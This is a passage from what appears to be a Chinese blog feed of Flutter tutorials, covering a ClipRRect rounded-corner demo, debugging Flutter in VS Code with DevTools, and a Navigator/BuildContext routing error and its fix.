language-java"><code class="language-java"> <span class="token function">ClipRRect</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     BorderRadius borderRadius<span class="token punctuation">,</span>      CustomClipper<span class="token operator">&lt;</span>RRect<span class="token operator">></span> clipper<span class="token punctuation">,</span>      Clip clipBehavior <span class="token operator">=</span> Clip<span class="token punctuation">.</span>antiAlias<span class="token punctuation">,</span>      Widget child     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="完整Demo"><a href="#完整Demo" class="headerlink" title="完整Demo"></a>完整Demo</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> <span class="token string">'package:flutter/material.dart'</span><span class="token punctuation">;</span><span class="token keyword">const</span> pageData <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"discountStatus"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>     <span class="token string">"subscribeStatus"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>     <span class="token string">"title"</span><span class="token operator">:</span> <span class="token string">"限时免费"</span><span class="token punctuation">,</span>     <span class="token string">"subTitle"</span><span class="token operator">:</span> <span class="token string">"活动时间9月1日-9月30日"</span><span class="token punctuation">,</span>     <span class="token string">"packageList"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token operator">:</span> <span class="token number">23</span><span class="token punctuation">,</span>             <span class="token string">"desc"</span><span class="token operator">:</span> <span class="token string">"月度订阅"</span><span class="token punctuation">,</span>             <span class="token string">"dealPrice"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>             <span class="token string">"originPrice"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>             <span class="token string">"recommand"</span><span class="token operator">:</span> <span class="token number">1</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>         <span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token operator">:</span> <span class="token number">33</span><span class="token punctuation">,</span>             <span class="token string">"desc"</span><span class="token operator">:</span> <span class="token string">"半年订阅"</span><span class="token punctuation">,</span>             <span class="token string">"dealPrice"</span><span class="token operator">:</span> <span class="token number">56</span><span class="token punctuation">,</span>             <span class="token string">"originPrice"</span><span class="token operator">:</span> <span class="token number">280</span><span class="token punctuation">,</span>             <span class="token string">"recommand"</span><span class="token operator">:</span> <span class="token number">0</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>         <span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token operator">:</span> <span class="token number">56</span><span class="token punctuation">,</span>             <span class="token string">"desc"</span><span class="token operator">:</span> <span class="token string">"年度订阅"</span><span class="token punctuation">,</span>             <span class="token string">"dealPrice"</span><span class="token operator">:</span> <span class="token number">108</span><span class="token punctuation">,</span>             <span class="token string">"originPrice"</span><span class="token operator">:</span> <span class="token number">540</span><span class="token punctuation">,</span>             <span class="token string">"recommand"</span><span class="token operator">:</span> <span class="token number">0</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">BatchSub</span> <span class="token keyword">extends</span> <span class="token class-name">StatefulWidget</span> <span class="token punctuation">{</span>  <span class="token annotation punctuation">@override</span>  <span class="token function">createState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">BatchSubState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">BatchSubState</span> <span class="token keyword">extends</span> <span class="token class-name">State</span><span class="token operator">&lt;</span>BatchSub<span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token annotation punctuation">@override</span>  Widget <span class="token function">build</span><span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">Scaffold</span><span class="token punctuation">(</span>      appBar<span class="token operator">:</span> <span class="token function">AppBar</span><span class="token punctuation">(</span>        title<span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">"优选访客订阅功能"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>      body<span class="token operator">:</span> <span class="token function">buildBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  Widget <span class="token function">buildBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Column</span><span class="token punctuation">(</span>      mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>start<span class="token punctuation">,</span>      children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>        <span class="token function">buildHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// Row(children: &lt;Widget>[</span>        <span class="token comment" spellcheck="true">//   Text(</span>        <span class="token comment" spellcheck="true">//     '批量管理功能',</span>        <span class="token comment" spellcheck="true">//     style:TextStyle(</span>        <span class="token comment" spellcheck="true">//       fontSize: 16.0,</span>        <span class="token comment" spellcheck="true">//       color: Color.fromRGBO(234,200,134,1)</span>        <span class="token comment" spellcheck="true">//     )</span>        <span class="token comment" spellcheck="true">//   )</span>        <span class="token comment" spellcheck="true">// ],)</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  Widget <span class="token function">buildHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Container</span><span class="token punctuation">(</span>      height<span class="token operator">:</span> <span class="token number">160.0</span><span class="token punctuation">,</span>      width<span class="token operator">:</span> MediaQuery<span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">.</span>width<span class="token punctuation">,</span>      decoration<span class="token operator">:</span> <span class="token function">BoxDecoration</span><span class="token punctuation">(</span>        image<span class="token operator">:</span> <span class="token function">DecorationImage</span><span class="token punctuation">(</span>          image<span class="token operator">:</span> <span class="token function">AssetImage</span><span class="token punctuation">(</span><span class="token string">"images/header.png"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          fit<span class="token operator">:</span> BoxFit<span class="token punctuation">.</span>cover        <span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>      child<span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>        mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// alignment: WrapAlignment.center,</span>        <span class="token comment" spellcheck="true">// crossAxisAlignment: WrapCrossAlignment.center,</span>        <span class="token comment" spellcheck="true">// runSpacing: 9.0,</span>        children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>          <span class="token function">Row</span><span class="token punctuation">(</span>            crossAxisAlignment<span class="token operator">:</span> CrossAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>            mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>            children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>              <span class="token function">Text</span><span class="token punctuation">(</span>                <span class="token string">'批量管理功能'</span><span class="token punctuation">,</span>                style<span class="token operator">:</span><span class="token function">TextStyle</span><span class="token punctuation">(</span>                  fontSize<span class="token operator">:</span> <span class="token number">16.0</span><span class="token punctuation">,</span>                  color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token function">Wrap</span><span class="token punctuation">(</span>            runSpacing<span class="token operator">:</span> <span class="token number">9.0</span><span class="token punctuation">,</span>            alignment<span class="token operator">:</span> WrapAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>            children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>              <span class="token function">Row</span><span class="token punctuation">(</span>                crossAxisAlignment<span class="token operator">:</span> CrossAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>                  <span class="token function">Text</span><span class="token punctuation">(</span>                    <span class="token string">'${pageData['</span>title<span class="token string">']}'</span><span class="token punctuation">,</span>                    style<span class="token operator">:</span><span class="token function">TextStyle</span><span class="token punctuation">(</span>                      fontSize<span class="token operator">:</span> <span class="token number">38.0</span><span class="token punctuation">,</span>                      color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span>                  <span class="token punctuation">)</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true">//自定义圆角</span>              <span class="token function">ClipRRect</span><span class="token punctuation">(</span>                borderRadius<span class="token operator">:</span> BorderRadius<span class="token punctuation">.</span><span class="token function">circular</span><span class="token punctuation">(</span><span class="token number">12.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                child<span class="token operator">:</span> <span class="token function">Container</span><span class="token punctuation">(</span>                  height<span class="token operator">:</span> <span class="token number">25.0</span><span class="token punctuation">,</span>                  width<span class="token operator">:</span> <span class="token number">190.0</span><span class="token punctuation">,</span>                  color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  child<span class="token operator">:</span> <span class="token function">Row</span><span class="token punctuation">(</span>                    crossAxisAlignment<span class="token operator">:</span> CrossAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                    mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                    children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>                      <span class="token function">Text</span><span class="token punctuation">(</span>                        <span class="token string">'${pageData['</span>subTitle<span class="token string">']}'</span><span class="token punctuation">,</span>                         textAlign<span class="token operator">:</span> TextAlign<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                        style<span class="token operator">:</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                      <span class="token punctuation">)</span>                    <span class="token punctuation">]</span>                  <span class="token punctuation">)</span>                <span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token punctuation">)</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> flutter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode中调试Flutter</title>
      <link href="2019/09/17/flutterDebug/"/>
      <url>2019/09/17/flutterDebug/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前每次启动flutter时首先是要<code>open -a Simulator</code>打开本地的模拟器（我这里是Mac Xcode的iOS模拟器），然后在运行<code>flutter run</code>命令，这是才会把程序运行的模拟器；</p><pre class="line-numbers language-js"><code class="language-js">Launching lib<span class="token operator">/</span>main<span class="token punctuation">.</span>dart on iPhone Xʀ <span class="token keyword">in</span> debug mode<span class="token operator">...</span>Running Xcode build<span class="token operator">...</span>                                                   ├─Assembling Flutter resources<span class="token operator">...</span>                           <span class="token number">6</span><span class="token punctuation">.</span>3s └─Compiling<span class="token punctuation">,</span> linking and signing<span class="token operator">...</span>                         <span class="token number">5</span><span class="token punctuation">.</span>3sXcode build done<span class="token punctuation">.</span>                                           <span class="token number">13</span><span class="token punctuation">.</span>0sSyncing files to device iPhone Xʀ<span class="token operator">...</span>                                     <span class="token number">2</span><span class="token punctuation">,</span>176ms <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在每次修改代码时都要进行如下操作：</p><pre class="line-numbers language-js"><code class="language-js">🔥  To hot reload changes <span class="token keyword">while</span> running<span class="token punctuation">,</span> press <span class="token string">"r"</span><span class="token punctuation">.</span> To hot restart <span class="token punctuation">(</span>and rebuild state<span class="token punctuation">)</span><span class="token punctuation">,</span> press <span class="token string">"R"</span><span class="token punctuation">.</span>An Observatory <span class="token keyword">debugger</span> and profiler on iPhone Xʀ is available at<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">57979</span><span class="token regex">/DumG7IuwegU=/</span>For a more detailed help message<span class="token punctuation">,</span> press <span class="token string">"h"</span><span class="token punctuation">.</span> To detach<span class="token punctuation">,</span> press <span class="token string">"d"</span><span class="token punctuation">;</span> to quit<span class="token punctuation">,</span> press <span class="token string">"q"</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>感觉是有起来特别的不方便，要是忘记使用<code>r</code> 或 <code>R</code>来reload的话还以为自己代码写错了。</p><p>那么平时开发的使用我们该如何来操作呢？</p><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>1、首先是找到vscode断点调试按钮  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter.png" alt></p><p>2、然后点击debug断点，第一次会提示你选择语言，选择Dart&amp;Flutter即可，我下面这个是选择完调试语言之后的页面  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter1.png" alt></p><p>3、debug运行之后你本地vscode可能会出现下面提示    </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter3.png" alt></p><p>这个是让你激活Dart DevTools工具，可以直接点击左侧的激活按钮，会自动在浏览器上打开调试页面，如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter6.png" alt></p><p>那有的同学说了我这根本就没有弹出这个弹窗啊，说明你之前已经绑定过DevTools了，你只需要在vscode中使用快捷键<code>command+shift+p</code>打开如下工具栏：  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter5.png" alt>  </p><p>然后在里面输入<code>Open DevTools</code>也是能直接打开并跳转到浏览器的调试窗口的；</p><p>上面的端口号都是默认的，我这没有主动修改端口号。</p><p>4、那么以上工作完成之后我们就能够在vscode里面进行代码调试了  </p><p>（当然了你也可以不使用DevTools）也能直接在vscode里面调试的  </p><p>在你想要调试的地方打上断点  如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter7.png" alt>  </p><p>在触发了断点执行之后：  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutter8.png" alt> </p><p>这样就可以在你本地一步步的断点调试你本地代码了。</p><p>以上这些都是本人在开发过程中的一些总结，希望能帮到你们，感谢各位的支持。   </p>]]></content>
      
      
      <categories>
          
          <category> flutter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
            <tag> vscode </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一个路由报错来深入理解Flutter的BuildContext</title>
      <link href="2019/09/17/BuildContext/"/>
      <url>2019/09/17/BuildContext/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在使用flutter路由跳转是出现如下错误：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/fluttererr1.png" alt></p><p>代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token string">'package:flutter/material.dart'</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">runApp</span><span class="token punctuation">(</span><span class="token function">MyApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">MyApp</span> <span class="token keyword">extends</span> <span class="token class-name">StatelessWidget</span> <span class="token punctuation">{</span>  @override  Widget <span class="token function">build</span><span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MaterialApp</span><span class="token punctuation">(</span>      title<span class="token punctuation">:</span> <span class="token string">'Test Flutter'</span><span class="token punctuation">,</span>      home<span class="token punctuation">:</span> <span class="token function">Scaffold</span><span class="token punctuation">(</span>        body<span class="token punctuation">:</span> <span class="token function">Center</span><span class="token punctuation">(</span>          child<span class="token punctuation">:</span> <span class="token function">FlatButton</span><span class="token punctuation">(</span>              onPressed<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Navigator<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>                    <span class="token function">MaterialPageRoute</span><span class="token punctuation">(</span>builder<span class="token punctuation">:</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>              child<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">'跳转'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">NewRouter</span> <span class="token keyword">extends</span> <span class="token class-name">StatelessWidget</span> <span class="token punctuation">{</span>  @override  Widget build <span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">Scaffold</span><span class="token punctuation">(</span>      appBar<span class="token punctuation">:</span> <span class="token function">AppBar</span><span class="token punctuation">(</span>        title<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">"hahahha"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>      body<span class="token punctuation">:</span> <span class="token function">Center</span><span class="token punctuation">(</span>        child<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">"new router hahah"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>把home部分作为一个新的Widget拆出来就可以了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token string">'package:flutter/material.dart'</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">runApp</span><span class="token punctuation">(</span><span class="token function">MyApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">MyApp</span> <span class="token keyword">extends</span> <span class="token class-name">StatelessWidget</span> <span class="token punctuation">{</span>  @override  Widget <span class="token function">build</span><span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MaterialApp</span><span class="token punctuation">(</span>      title<span class="token punctuation">:</span> <span class="token string">'Test Flutter'</span><span class="token punctuation">,</span>      home<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">MyHomeWidget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyHomeWidget</span> <span class="token keyword">extends</span> <span class="token class-name">StatelessWidget</span> <span class="token punctuation">{</span>  @override  Widget <span class="token function">build</span><span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Scaffold</span><span class="token punctuation">(</span>      appBar<span class="token punctuation">:</span> <span class="token function">AppBar</span><span class="token punctuation">(</span>title<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">'new Flutter'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Center</span><span class="token punctuation">(</span>          child<span class="token punctuation">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>            mainAxisAlignment<span class="token punctuation">:</span> MainAxisAlignment<span class="token punctuation">.</span>start<span class="token punctuation">,</span>            children<span class="token punctuation">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>              <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">'my first flutter app'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token function">FlatButton</span><span class="token punctuation">(</span>                color<span class="token punctuation">:</span> Colors<span class="token punctuation">.</span>green<span class="token punctuation">,</span>                child<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">'路由跳转'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                textColor<span class="token punctuation">:</span> Colors<span class="token punctuation">.</span>white<span class="token punctuation">,</span>                onPressed<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  Navigator<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>                     <span class="token function">MaterialPageRoute</span><span class="token punctuation">(</span>builder<span class="token punctuation">:</span> <span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">{</span>                      <span class="token keyword">return</span> <span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span>                  <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token punctuation">)</span>            <span class="token punctuation">]</span>          <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">NewRouter</span> <span class="token keyword">extends</span> <span class="token class-name">StatelessWidget</span> <span class="token punctuation">{</span>  @override  Widget build <span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">Scaffold</span><span class="token punctuation">(</span>      appBar<span class="token punctuation">:</span> <span class="token function">AppBar</span><span class="token punctuation">(</span>        title<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">"hahahha"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>      body<span class="token punctuation">:</span> <span class="token function">Center</span><span class="token punctuation">(</span>        child<span class="token punctuation">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">"new router hahah"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么我的Navigator操作会出现当前的context找不到Navigator的情况，为什么拆成新的widget就好了？</p><p>那下面就来具体分析一下</p><h2 id="Navigator"><a href="#Navigator" class="headerlink" title="Navigator"></a>Navigator</h2><p>我们经常会在应用中打开许多页面，当我们返回的时候，它会先后退到上一个打开的页面，然后一层一层后退，没错这就是一个堆栈。而在Flutter中，则是由Navigator来负责管理维护这些页面堆栈。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//压一个新的页面到屏幕上</span>Navigator<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>push<span class="token comment" spellcheck="true">//把路由顶层的页面移除</span>Navigator<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通常我们我们在构建应用的时候并没有手动去创建一个Navigator，也能进行页面导航，这又是为什么呢。</p><p>没错，这个Navigator正是MaterialApp为我们提供的。但是如果home，routes，onGenerateRoute和onUnknownRoute都为null，并且builder不为null，MaterialApp则不会创建任何Navigator。</p><h2 id="BuildContext"><a href="#BuildContext" class="headerlink" 